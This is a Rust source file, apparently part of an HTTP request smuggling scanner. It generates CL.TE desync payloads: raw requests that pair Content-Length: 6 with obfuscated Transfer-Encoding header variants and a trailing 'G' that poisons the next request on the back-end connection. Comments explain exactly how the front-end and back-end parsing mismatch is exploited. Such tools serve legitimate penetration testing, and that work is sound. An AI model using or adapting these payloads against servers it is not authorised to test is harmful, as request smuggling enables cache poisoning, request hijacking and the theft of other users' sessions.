use super::{format_cookies, format_custom_headers, te_variations::get_te_header_variations};

/// Generate CL.TE (Content-Length vs Transfer-Encoding) attack payloads.
///
/// Returns raw request bytes (`Vec<Vec<u8>>`) so the Transfer-Encoding
/// obfuscation variants that embed bytes > 0x7F (NEL, NBSP, soft-hyphen, …) are
/// sent verbatim rather than mangled into U+FFFD by a UTF-8 `String`.
pub fn get_cl_te_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<Vec<u8>> {
    let te_headers = get_te_header_variations();

    let mut payloads = Vec::with_capacity(te_headers.len());
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    for te_header in &te_headers {
        // Everything up to and including `Content-Length: 6\r\n` is ASCII; the TE
        // header line is spliced in as raw bytes; the fixed body `0\r\n\r\nG`
        // (exactly 6 bytes) follows the header terminator. The front-end (CL)
        // reads 6 bytes and forwards them; the back-end (TE) stops at the `0\r\n`
        // chunk terminator, leaving `G` to prefix the next request — the CL.TE
        // desync.
        let head = format!(
            "{method} {path} HTTP/1.1\r\n\
             Host: {host}\r\n\
             Connection: keep-alive\r\n\
             {custom_header_str}\
             {cookie_str}\
             Content-Length: 6\r\n"
        );
        let mut req = Vec::with_capacity(head.len() + te_header.len() + 16);
        req.extend_from_slice(head.as_bytes());
        req.extend_from_slice(te_header);
        req.extend_from_slice(b"\r\n\r\n0\r\n\r\nG");
        payloads.push(req);
    }
    payloads
}
